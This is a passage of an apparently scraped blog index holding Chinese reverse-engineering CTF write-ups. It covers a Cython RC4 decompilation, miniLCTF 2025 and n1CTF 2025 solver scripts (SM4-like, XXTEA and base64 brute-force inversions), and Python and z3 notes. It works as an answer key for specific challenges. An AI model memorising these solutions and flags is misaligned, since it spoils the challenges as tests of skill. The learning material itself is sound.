(*(_QWORD *)v68)-- == 1LL;        if ( v39 )          Py_Dealloc(v68);      &#125;      s_i = _Pyx_PyObject_GetItem(sbox2, iY256);// s[i]      s = s_i;      if ( !s_i )      &#123;        sj_y256 = 0LL;        v7 = 3113;        goto LABEL_278;      &#125;      s2 = PyNumber_Add(j2, s_i);               // j+s[i]      if ( !s2 )      &#123;        sj_y256 = 0LL;        v7 = 3115;        goto LABEL_268;      &#125;      if ( *(int *)s &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s)-- == 1LL;        if ( v39 )          Py_Dealloc(s);      &#125;      j_add_si = _Pyx_PyInt_RemainderObjC(s2, _pyx-&gt;int_256);// (j+s[i])%256      if ( !j_add_si )      &#123;        sj_y256 = 0LL;        v7 = 3118;        goto LABEL_274;      &#125;      if ( *(int *)s2 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s2)-- == 1LL;        if ( v39 )          Py_Dealloc(s2);      &#125;      v72 = j2;      v83 = (_QWORD *)j_add_si;      j2 = (int *)j_add_si;                     // 赋值回j      if ( *v72 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)v72)-- == 1LL;        if ( v39 )          Py_Dealloc(v72);      &#125;      s = _Pyx_PyObject_GetItem(sbox2, j_add_si);// 在盒中查找值s[j]      if ( !s )      &#123;        sj_y256 = 0LL;        v4 = 26;        v7 = 3131;        goto LABEL_278;      &#125;      s2 = _Pyx_PyObject_GetItem(sbox2, iY256_);// s[i]      if ( !s2 )      &#123;        sj_y256 = 0LL;        v4 = 26;        v7 = 3133;        goto LABEL_268;      &#125;      if ( (int)PyObject_SetItem(sbox2, iY256_, s) &lt; 0 )      &#123;        sj_y256 = 0LL;        v4 = 26;        v7 = 3135;        goto LABEL_268;      &#125;      if ( *(int *)s &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s)-- == 1LL;        if ( v39 )          Py_Dealloc(s);      &#125;      if ( (int)PyObject_SetItem(sbox2, j2, s2) &lt; 0 )// 交换s[i],s[j]      &#123;        sj_y256 = 0LL;        v4 = 26;        v7 = 3137;        goto LABEL_274;      &#125;      if ( *(int *)s2 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s2)-- == 1LL;        if ( v39 )          Py_Dealloc(s2);      &#125;      s2 = _Pyx_PyObject_GetItem(sbox2, iY256_);// s2 = s[i]      if ( !s2 )      &#123;        sj_y256 = 0LL;        v4 = 27;        v7 = 3147;        goto LABEL_278;      &#125;      s_j2 = _Pyx_PyObject_GetItem(sbox2, j2);  // s[j]      s = s_j2;      if ( !s_j2 )      &#123;        sj_y256 = 0LL;        v4 = 27;        v7 = 3149;        goto LABEL_274;      &#125;      sj_y256 = (int *)_Pyx_PyInt_RemainderObjC(s_j2, _pyx-&gt;int_256);// s[j]%256      if ( !sj_y256 )      &#123;        v4 = 27;        v7 = 3151;        goto LABEL_268;      &#125;      if ( *(int *)s &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s)-- == 1LL;        if ( v39 )          Py_Dealloc(s);      &#125;      s = PyNumber_Add(s2, sj_y256);            // s = s[i] + s[j] %256      if ( !s )      &#123;        v4 = 27;        v7 = 3154;        goto LABEL_274;      &#125;      if ( *(int *)s2 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s2)-- == 1LL;        if ( v39 )          Py_Dealloc(s2);      &#125;      s2 = 0LL;      if ( *sj_y256 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)sj_y256)-- == 1LL;        if ( v39 )          Py_Dealloc(sj_y256);      &#125;      sj_y256 = (int *)_Pyx_PyInt_RemainderObjC(s, _pyx-&gt;int_256);// s %256      if ( !sj_y256 )      &#123;        v4 = 27;        v7 = 3158;        goto LABEL_268;      &#125;      if ( *(int *)s &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s)-- == 1LL;        if ( v39 )          Py_Dealloc(s);      &#125;      v74 = v80;      v80 = sj_y256;      if ( *v74 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)v74)-- == 1LL;        if ( v39 )          Py_Dealloc(v74);      &#125;      s_j3 = _Pyx_PyObject_GetItem(sbox2, sj_y256);// s[sj_y256],这里实现了s[(s[i] + s[j] % 256) % 256]      sj_y256 = (int *)s_j3;      if ( !s_j3 )      &#123;        v4 = 28;        v7 = 3170;        goto LABEL_278;      &#125;      s = _Pyx_PyInt_RemainderObjC(s_j3, _pyx-&gt;int_256);// s[j]%256      if ( !s )      &#123;        v4 = 28;        v7 = 3172;        goto LABEL_278;      &#125;      if ( *sj_y256 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)sj_y256)-- == 1LL;        if ( v39 )          Py_Dealloc(sj_y256);      &#125;      sj_y256 = (int *)PyNumber_Xor(m5, s);     // 密文与得到的结果异或，m ^ s[j] % 256      if ( !sj_y256 )      &#123;        v4 = 28;        v7 = 3175;        goto LABEL_268;      &#125;      if ( *(int *)s &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s)-- == 1LL;        if ( v39 )          Py_Dealloc(s);      &#125;      s = _Pyx_PyObject_CallOneArg(qword_18000BF40, sj_y256);// 猜这里是把异或的密文转成字符串      if ( !s )      &#123;        v4 = 28;        v7 = 3178;        goto LABEL_278;      &#125;      if ( *sj_y256 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)sj_y256)-- == 1LL;        if ( v39 )          Py_Dealloc(sj_y256);      &#125;      sj_y256 = (int *)PyNumber_InPlaceAdd(flag, s);// flag += s,这里实现了字符串加法      if ( !sj_y256 )      &#123;        v4 = 28;        v7 = 3181;        goto LABEL_268;      &#125;      if ( *(int *)s &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s)-- == 1LL;        if ( v39 )          Py_Dealloc(s);      &#125;      v76 = (int *)flag;      flag = (__int64 *)sj_y256;                // 结果保存到flag中      if ( *v76 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)v76)-- == 1LL;        if ( v39 )          Py_Dealloc(v76);      &#125;      m2 = m1;      iint0 = (__int64 *)i2;                    // 赋值i到iint0中进行准备下一轮循环      if ( count4 &gt;= *((_QWORD *)m1 + 2) )      &#123;        v2 = (__int64 *)j2;        v60 = m1;                               // 跳转到上面实现循环，进行下一轮加密        goto LABEL_226;      &#125;    &#125; ......    _Pyx_AddTraceback(&quot;source.rc4&quot;, v7, v4, &quot;source.pyx&quot;); ......  return s2;&#125;\n\ndis导出密文python中的dis()函数可以查看模块包含的对象，有时候可能会有密文之类的，可以直接print打印。\n总结我们发现一个cython函数里面其实有很多我们不需要分析的东西，像一些由许多跳转的if其实我们根本就不需要管，这些代码把一个操作分成了许多步，有一些操作其实我们心理大概有数就行了，对一个cython函数的分析，我们需要大胆的猜，对变量进行追踪，弄清关键数据操作的作用就行了，数据操作比较复杂时可以自己写伪代码记录一下。 \t\n","categories":["Re学习"],"tags":["re,学习"]},{"title":"2025miniLCTF 部分Re-wp+复现","url":"/2025/05/19/miniLCTF2025/","content":"x96re逻辑如下\n&quot;&quot;&quot;buf4  = buf0 ^ f(buf1 ^ buf2 ^buf3 ) ^ key4..buf35 = buf31 ^ f(buf32 ^ buf33 ^ buf34) ^ key35dec:buf31 = buf35 ^ f(buf32 ^ buf33 ^ buf34) ^ key35bufn = buf[n+4] ^ f(buf[n+1] ^ buf[n+2] ^ buf[n+3]) ^ key[n+4]&quot;&quot;&quot;key =[0x918188F3, 0x3BC35D39, 0xB1EE5F1, 0x935103FD, 0xAEEB97C8, 0x77084D36, 0xD6B5DE83, 0x37AA6640, 0x6A145898, 0x4F356F1D, 0xB5D86522, 0xBFD70CDE, 0x356703DC, 0xE7111E66, 0xB8C167DA, 0x386AE3F5, 0x81BEBDC1, 0xBAC0EE25, 0x1909DEA9, 0x9095E8B, 0x8611D4E8, 0xD0DCCCFD, 0xE3376831, 0x32A4957D, 0x28A321B9, 0xA76F24D1, 0x52827D19, 0xD5A0379B, 0x48092956, 0xA59D9548, 0x6D6B698D, 0x44853F0E, 0x22A8A3CE, 0xB0762BD6, 0x1DBAA385, 0x76E5D7D7]TBL_BOX = [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48]mm =[0xDCBEE7D4, 0x78FB2439, 0xC06E8000, 0xD3C34A2C, 0xF53837D5, 0xA9C8D88D, 0x20CBDAE5, 0x2551D478]def _rol_32(data,shift):    data = (data&lt;&lt;shift) | (data&gt;&gt;(32-shift))    data &amp;=0xffffffff    return datadef dword2byte_big(data):    res = []    for i in range(4):        res.append((data &gt;&gt; (8 * (3 - i))) &amp; 0xff)    return resdef bytes2dword_big(bytesdata):    res = 0    for i in range(4):        res ^= (bytesdata[i] &lt;&lt; (8 * (3 - i))) &amp; 0xffffffff    return resdef func_data(data):    data = dword2byte_big(data)    data1 =[]    for i in data:        data1.append(TBL_BOX[i])    data = bytes2dword_big(data1)    data1 = _rol_32(data,2)    data3 = data1 ^ data    data4 = _rol_32(data,10) ^ data3    data5 = _rol_32(data,18) ^ data4    data = data5 ^ _rol_32(data,24)    return datadef dec(mm):    result =[]    for i in range(len(mm)//4):        buf = [0]*32        enc = mm[4*i:4*i+4:]        enc.reverse()        buf.extend(enc)        for n in range(31,-1,-1):            buf[n] = buf[n+4] ^ func_data(buf[n+1] ^ buf[n+2] ^ buf[n+3] ^ key[n+4])        for k in range(4):            result.extend(dword2byte_big(buf[k]))    return resultdef enc(data):    res = []    for k in range(len(data)//16):        buf = [0]*4        for i in range(4):            buf[i] = bytes2dword_big(data[i * 4 + 16 * k:i * 4 + 4 + 16 * k:])        buf.extend([0] * 32)        for n in range(32):            buf[n + 4] = buf[n] ^ func_data(buf[n + 1] ^ buf[n + 2] ^ buf[n + 3] ^ key[n + 4])        res.extend(buf[32:36:][::-1])    return resdef xor(data,value):    res =[]    for i in range(32):        if i&gt;= 30: res.append(data[i])        else: res.append(data[i] ^value)    return reslittmm =[]for i in mm:    littmm.append(int.from_bytes(i.to_bytes(4,&quot;little&quot;)))a =dec(littmm)b = xor(a,0x4c)flag = &quot;&quot;for i in b:    flag += chr(i)print(&quot;miniLCTF&#123;&quot;+flag+&quot;&#125;&quot;)\n\n\n\n0.s1gn1nimport base64xorkey = [    0x58, 0x69, 0x7B, 0x06, 0x1E, 0x38, 0x2C, 0x20, 0x04, 0x0F, 0x01, 0x07,    0x31, 0x6B, 0x08, 0x0E, 0x7A, 0x0A, 0x72, 0x72, 0x26, 0x37, 0x6F, 0x49,    0x21, 0x16, 0x11, 0x2F, 0x1A, 0x0D, 0x3C, 0x1F, 0x2B, 0x32, 0x1A, 0x34,    0x37, 0x7F, 0x03, 0x44, 0x16, 0x0E, 0x01, 0x28, 0x1E, 0x68, 0x64, 0x23,    0x17, 0x09, 0x3D, 0x64, 0x6A, 0x69, 0x63, 0x18, 0x18, 0x0A, 0x15, 0x70]base64_chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;tableint = [i for i in map(ord,base64_chars)]max_len = 60def is_printable(bs):    return all(32 &lt;= b &lt;= 126 for b in bs)def dfs(i, data,  current_sum,len,target_sum):    if i % 4 ==0 and i&gt;0: #剪枝1，是否能被解码为可见字符        try:            b64 = &#x27;&#x27;.join(map(chr, data[:i]))            decoded = base64.b64decode(b64, validate=True)            if not is_printable(decoded):                return        except:            return    if current_sum &gt; target_sum: return #剪枝2，当前和是否大于给定值    if i == len : #长度符合要求        if current_sum == target_sum: #总和是否符合要求            # print(data)            print(&quot;Found:&quot;, &#x27;&#x27;.join(map(chr, data[0:60:]))) #打印结果            return        else: return    if data[i]== 0x3d:        sum = data[i] ^ data[i - 1] ^ xorkey[i]        dfs(i + 1, data, current_sum + sum, len, target_sum)    else:        for c in tableint:            data[i] = c            sum = data[i] ^ data[i - 1] ^ xorkey[i]            dfs(i + 1, data, current_sum + sum, len, target_sum)for j in range(35,61): #爆破的长度    for i in tableint: #爆破每个字符        for k in range(3):            input_str = [0] * max_len            input_str[0] = i            if k &gt;= 1:input_str[j - 1] = 0x3d #考虑有等于的情况            if k ==2:input_str[j-2] =0x3d            dfs(1, input_str, i, j, 28 + j)realres = &quot;X1JLRjFfbmlkZ197MG5GaV9pQGVycnRMfTNzM21ucmlDZ2VubkV2X1RJRXM=&quot; #正确的那个结果res = base64.b64decode(realres).decode()reslen =len(res)tables =&quot;&quot;.join(chr(i) for i in range(48,48+reslen))print(tables) #0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[index =[i for i in range(reslen)]t = dict()for i,j in zip(tables,index):     t[i] =jstrr =&quot;O?P7Q@R3SAT8UBV1WCX9YDZ4[E:F0G;H5I&lt;J2K=L6M&gt;N&quot; #ida里打乱得出的顺序tt =[t[i] for i in strr] #生成对应表flaglist = [0]*reslenfor i in range(reslen):    flaglist[tt[i]] = res[i] #按照对应表还原flag =&quot;&quot;.join(flaglist)print(flag)\n\nd1ffer3ncexxtea加解密逻辑如下\n#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#define DELTA 1298755177void btea(uint32_t* v, int n, uint32_t const key[4])&#123;    uint32_t y, z, sum, delta;    unsigned p, rounds, e;    delta = 1298755177;  //魔改1    rounds = 6 + 2025 / n;\t//魔改2    sum = 0;    z = v[n - 1];    do    &#123;        sum += delta;        e = (sum &gt;&gt; 2) &amp; 3;        for (p = 0; p &lt; n - 1; p++)            &#123;            y = v[p + 1];            z = v[p] += (((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)));        &#125;        y = v[0];        z = v[n - 1] += (((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3)^ e] ^ z)));          &#125; while (--rounds);&#125;void dec_btea(uint32_t* v, int n, uint32_t const key[4])&#123;    uint32_t y, z, sum, delta;    unsigned p, rounds, e;    delta = 1298755177;    rounds = 6 + 2025 / n;    sum = rounds * delta;    y = v[0];    do    &#123;        e = (sum &gt;&gt; 2) &amp; 3;        for (p = n - 1; p &gt; 0; p--)          &#123;            z = v[p - 1];            y = v[p] -= (((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p ^e) &amp;3] ^ z)));        &#125;        z = v[n - 1];        y = v[0] -= (((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p ^e) &amp;3] ^ z)));   //这里的MX中传入的 p=0        sum -= delta;    &#125; while (--rounds);&#125;int main()&#123;    uint32_t const k[4] = &#123; 0x33323130, 0x37363534, 0x62613938, 0x66656463 &#125;;\tuint32_t mm[8] = &#123; 0xbeae9d72,0x5b84e3a2,0xf1010f31,0xc203e7b3,0x9c0a814c,0x4d2ceda0,0x14a25292,0x21772d88 &#125;;    int n = 8;    dec_btea(mm, n, k);    for (int i = 0; i &lt; 8; i++) &#123;\t\tfor (int j = 0; j &lt; 4; j++)\t\t\tprintf(&quot;%c&quot;, (mm[i]&gt;&gt; (8*j))&amp;0xff);\t&#125;    return 0;&#125;\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"python脚本","url":"/2024/12/25/python%E8%84%9A%E6%9C%AC/","content":"enumerate()enumerate(obj)  # 迭代器，输入可迭代对象，返回索引和迭代元素for i, char in enumerate(chars):\nfromhex()bytes.fromhex(hex_char) # 输入十六进制，按两位转换为byte数据\njoin()separator.join(iterable) # 将可迭代对象中的元素连接成一个新的字符串。# separator：连接符，通常是一个字符串，表示元素之间的分隔符。# iterable：一个可迭代对象（如列表、元组、字符串等）要求元素是字符串。chars = &quot;&quot;.join(chr(i) for i in range(32,127))\nget()dict.get(key, default=None)# 获取字典中指定键对应的值。# key：要查找的键。# default：当指定的 key 不在字典中时返回的默认值。如果未指定，默认返回 None。plaintext += mp.get(bytes([b]), &#x27;?&#x27;)  # 用get获取键的值，如果没有匹配，使用占位符\nlocaltime()time_local = time.localtime(timestamp) # 把时间戳转化为时间dt = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time_local) # 把时间按格式输出\nbase64import base64base64.decodebytes(bflag) # 输入byte数据，解码base64\nunhexlify()import binasciibinascii.unhexlify(string) # string：一个包含十六进制字符的字符串。这个字符串的长度应该是偶数# 返回一个字节对象（bytes），表示解码后的原始二进制数据。# ！！！unhexlify() 不接受带有空格的十六进制字符串，所以需要先将空格去掉。hex_string = &quot;68 65 6c 6c 6f&quot;result = binascii.unhexlify(hex_string.replace(&quot; &quot;, &quot;&quot;))print(result)  # 输出: b&#x27;hello&#x27;list(binascii.unhexlify(&quot;13141516&quot;))   #直接按2个十六进制字符生成列表，值为十进制\nto_bytes()int.to_bytes(length, byteorder, *, signed=False)# length：指定返回的字节串的长度（即字节数）。如果整数需要更多的字节才能表示，它会抛出 OverflowError。# byteorder：字节顺序，决定了多字节数值的字节排列顺序。可以是：# &#x27;big&#x27;：大端字节顺序（高位字节在前）。# &#x27;little&#x27;：小端字节顺序（低位字节在前）。# signed：是否考虑符号位，默认为 False，表示无符号整数。如果设置为 True，则允许转换负数。\n\n.hex().hex(bytes)   #可以把byte数据直接转为hex\n\nunsigned()\nunsigned(int) #可以把有符号整数转为无符号，以便转为bytes数据flag=b&quot;&quot;  # 打印集体的十六进制for i in result:    result = unsigned(i).to_bytes(4, &#x27;little&#x27;)  #小端序输出,前面的参数为字节大小    flag += resultprint(flag.hex())\n\nord()ord(str)  #可以把字符转为ASCII值\n\nint.from_bytes()int.from_bytes(bytes) #把bytes转为int\n\nmap()map(func,arr) #把arr中的每一个元素为参数调用func函数 -&gt;以func函数返回值组成的可迭代对象\n\nbytearry()bytearry(bytes) #把bytes数据按1字节转为byte数组 -&gt;byte数组\n\n\n\nz3求解器pip install z3-solver\nv5,v6, v7, v8, v9, v10= Ints(&#x27;v5 v6 v7 v8 v9 v10&#x27;) #定义多个整数变量x = z3.Real(&#x27;x&#x27;)  #创建实数变量x = z3.BitVec(&#x27;x&#x27;, 32) #创建向量变量，用于计算机位运算，第二个参数是大小，32位，即4字节p = z3.Bool(name = &#x27;p&#x27;) #创建布尔变量s = z3.Solver() #获取求解器实例s.add() #添加约束条件And() #与Or() #或Not() #否Implies() #依赖s.check() #检查解，有解为sat，无解为unsats.model() #获取结果s.model()[x] #获取特定的解s.model()[x].as_long() #把值转为python整数，以便进行数据处理\n一些脚本\nfrom z3 import *v5,v6, v7, v8, v9, v10= Ints(&#x27;v5 v6 v7 v8 v9 v10&#x27;)  #定义未知数a = Solver()a.add()   #方程组che = a.check()res = a.model()print(f&quot;求解结果&#123;res&#125;&quot;)variable_names = [v5, v6, v7, v8, v9, v10]  #输出的变量，按顺序排result_list = [res[var].as_long() for var in variable_names]print(f&quot;结果字符串&#123;result_list&#125;&quot;)flag = &quot;&quot;for i in result_list:    result = i.to_bytes(4, &#x27;little&#x27;)  #小端序输出,前面的参数为字节大小    flag += result.decode(&#x27;utf-8&#x27;)print(f&quot;flag: &#123;flag&#125;&quot;)\n\nfrom z3 import*flag =&quot;&quot;for i in range(0, 8, 2):    data = []    v12 = BitVec(&quot;input&quot;, 32)    s = Solver()    dt = ((v12 &lt;&lt; 4) &amp; 4198170623) + (v12 &gt;&gt; 28)    s.add(And(data[i] - 0x10 &lt;= dt, dt &lt;= data[i] + 0x10))    while s.check() == sat:        module = s.model()        result = module[v12].as_long()        result_hex = hex(result)[2:]               print(f&quot;&#123;result_hex&#125;&quot;)        flag += result_hexprint(f&quot;flag&#123;&#123;&#123;flag&#125;&#125;&#125;&quot;)\n\nshell数据提取发送\nfrom functools import cmp_to_keyimport refrom pwn import *r = remote(&quot;node2.anna.nssctf.cn&quot;, 28376)for i in range(100):    read = r.recvline()    data = read.split(b&quot;: &quot;)[1].strip().decode() #以：分隔数据，取后面的字符串得到数字的字符串形式    strs = data.split(&#x27; &#x27;) #以空格分割成数组    n = len(strs) #字符串个数   ...    r.sendline(senddata) # 发送结果    print(r.recvline())# 跳过一行，以便读取下一行print(r.recv())# 读取结果\n\nadd矩阵\nvar = list([Int(f&quot;&#123;i&#125;_&#123;j&#125;&quot;) for j in range(8)] for i in range(8))for i in range(8):     for j in range(8):         s.add(Sum([tableB[i][k] * var[k][j] for k in range(8)]) == mm1[i][j])\n\n","categories":["python脚本"],"tags":["re,工具"]},{"title":"2025n1CTF Re-wp+复现","url":"/2025/02/09/n1ctf/","content":"5mcvirtureprotect动态修改函数，用ida动态调试，给输入的数据下硬件断点运行分析就可以发现正确的逻辑。\n\n但是不能反汇编，选中按c恢复成汇编代码。\n\n直接读汇编写出加密代码，注意一下细节，每次循环左移的值都是不一样的，以防万一还是每次加密都细看了一下。一共有四种加密方法，四种加密循环进行一共十六次加密，顺序大概是box()–&gt;index()–&gt;shift(stat&#x3D;&#x3D;0)–&gt;shift(stat&#x3D;&#x3D;1)–&gt;……。直接写出逆向函数就行，密文就在比对的位置。\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;//加密函数int box(unsigned char* data) &#123;    unsigned char sbox[] = &#123; 0xB0, 0xF0, 0x21, 0xCF, 0xF2, 0x04, 0x3A, 0x68, 0x84, 0x7B, 0x39, 0x86, 0x36, 0x87, 0x9B, 0xF7,    0x3D, 0x18, 0x1E, 0x61, 0x1B, 0x2E, 0x6C, 0xDF, 0x2C, 0xAE, 0x65, 0x9D, 0xEB, 0x2F, 0xDA, 0xF4,    0xDE, 0xCA, 0x56, 0x92, 0x75, 0x3B, 0x62, 0x45, 0x06, 0x3C, 0x52, 0x33, 0x6E, 0x25, 0xCE, 0xA3,    0xD2, 0x44, 0xA1, 0x4A, 0x58, 0xB1, 0xA0, 0x2A, 0x47, 0x0A, 0x02, 0xAF, 0x50, 0xC3, 0xDC, 0xEA,    0xE5, 0x0D, 0x67, 0x91, 0xE1, 0x51, 0xE3, 0xC1, 0xAA, 0x95, 0x5C, 0x79, 0x72, 0x1C, 0x3F, 0xB8,    0xE8, 0x1F, 0xFF, 0x7A, 0x73, 0x26, 0x54, 0x9E, 0xED, 0xA9, 0x41, 0x20, 0xEF, 0xA6, 0x48, 0x97,    0x4F, 0xD4, 0xBB, 0x23, 0x66, 0xD9, 0xE4, 0x0B, 0x30, 0x15, 0xD7, 0x6B, 0x19, 0xCD, 0xC4, 0x08,    0xB4, 0xC8, 0x14, 0xFD, 0x7F, 0x28, 0x0E, 0x05, 0x0F, 0x4B, 0x6F, 0xF5, 0x90, 0x76, 0xBF, 0x60,    0xE7, 0x24, 0x78, 0x6D, 0x71, 0xA8, 0x43, 0xB5, 0x0C, 0x31, 0xF9, 0xA2, 0x9C, 0x99, 0xF6, 0x2D,    0xDB, 0xB7, 0xC9, 0x85, 0x81, 0x03, 0x64, 0x1D, 0x07, 0x34, 0x5A, 0xBD, 0x37, 0x4C, 0xA7, 0x5F,    0x46, 0xE9, 0x35, 0x93, 0x8D, 0xA5, 0xFB, 0x42, 0x01, 0xC2, 0x17, 0x12, 0x1A, 0x77, 0xC6, 0x53,    0x83, 0x4D, 0xB2, 0x10, 0x2B, 0xF8, 0x88, 0x6A, 0x3E, 0xD0, 0x7C, 0x63, 0x40, 0x27, 0xBE, 0xD5,    0x38, 0xD1, 0x74, 0xB6, 0x57, 0x94, 0xAB, 0x8A, 0xB9, 0xBC, 0x7D, 0xB3, 0x96, 0x7E, 0xFC, 0xAD,    0x22, 0x4E, 0xFA, 0xE0, 0xCB, 0x8B, 0xEE, 0x32, 0xA4, 0x16, 0xFE, 0x5B, 0x13, 0xDD, 0xC0, 0x9A,    0x5E, 0x8E, 0x29, 0xF3, 0x8F, 0x49, 0xE6, 0x9F, 0xF1, 0xC5, 0x70, 0x55, 0x8C, 0x11, 0xCC, 0x5D,    0xEC, 0x00, 0xAC, 0x89, 0xD3, 0x82, 0x69, 0xD6, 0xBA, 0xD8, 0x59, 0x98, 0x09, 0x80, 0xE2, 0xC7    &#125;;        for (int i = 0; i &lt; 32;i++) &#123;        data[i] = sbox[data[i]];    &#125;    return 0;&#125;int index(unsigned char* data) &#123;    unsigned char tmp[32], table[32] = &#123; 0x13, 0x1F, 0x10, 0x1D, 0x01, 0x0D, 0x07, 0x15, 0x08, 0x06, 0x16, 0x00, 0x0F, 0x0C, 0x02, 0x05, 0x0E,0x03, 0x12, 0x04, 0x18, 0x14, 0x1A, 0x1C, 0x1E, 0x19, 0x09, 0x1B, 0x11, 0x0B, 0x17, 0x0A &#125;;    for (int i = 0; i &lt; 32; i++) &#123;        tmp[table[i]] = data[i];    &#125;    for (int i = 0; i &lt; 32; i++) &#123;        data[table[i]] = tmp[i];    &#125;        return 0;&#125;int shift(int l, int r, unsigned char* data,int stat) &#123;    unsigned char indext2[] = &#123; 0x7D, 0xB7, 0x24, 0x7E, 0xC3, 0x6B, 0xBD, 0xD8, 0x7F, 0x13, 0x6E, 0x0F, 0x43, 0xCD, 0x6B, 0xCF, 0x18,               0x4F, 0x26, 0x18, 0x12, 0x2A, 0x7E, 0x9B, 0x27, 0x4C, 0x33, 0x67, 0x40, 0xC9, 0x9E, 0xC4 &#125;,        indextb2[] = &#123; 0x91, 0xDB, 0x9F, 0x5F, 0x26, 0x27, 0xD6, 0xA8, 0xBF, 0x41, 0x16, 0x79, 0xDE, 0x73, 0x16, 0xF8, 0x1E,                0xBA, 0x6A, 0xBE, 0xC6, 0x12, 0xB2, 0x39, 0x9E, 0xF3, 0x12, 0x4E, 0x02, 0x1C, 0xE2, 0x43 &#125;;    if (stat == 0) &#123;        for (int i = 0; i &lt; 32; i++) &#123;            unsigned char c;            c = data[i] ^ indext2[i];            data[i] = c + indextb2[i];            data[i] = (data[i] &lt;&lt; l) | (data[i] &gt;&gt; r);        &#125;    &#125;    else &#123;        for (int i = 0; i &lt; 32; i++) &#123;            data[i] = (data[i] + indextb2[i]) ^ indext2[i];            data[i] = (data[i] &lt;&lt; l) | (data[i] &gt;&gt; r);        &#125;    &#125;        return 0;&#125;//解密函数int rebox(unsigned char* data) &#123;    unsigned char sbox[] = &#123; 0xB0, 0xF0, 0x21, 0xCF, 0xF2, 0x04, 0x3A, 0x68, 0x84, 0x7B, 0x39, 0x86, 0x36, 0x87, 0x9B, 0xF7,    0x3D, 0x18, 0x1E, 0x61, 0x1B, 0x2E, 0x6C, 0xDF, 0x2C, 0xAE, 0x65, 0x9D, 0xEB, 0x2F, 0xDA, 0xF4,    0xDE, 0xCA, 0x56, 0x92, 0x75, 0x3B, 0x62, 0x45, 0x06, 0x3C, 0x52, 0x33, 0x6E, 0x25, 0xCE, 0xA3,    0xD2, 0x44, 0xA1, 0x4A, 0x58, 0xB1, 0xA0, 0x2A, 0x47, 0x0A, 0x02, 0xAF, 0x50, 0xC3, 0xDC, 0xEA,    0xE5, 0x0D, 0x67, 0x91, 0xE1, 0x51, 0xE3, 0xC1, 0xAA, 0x95, 0x5C, 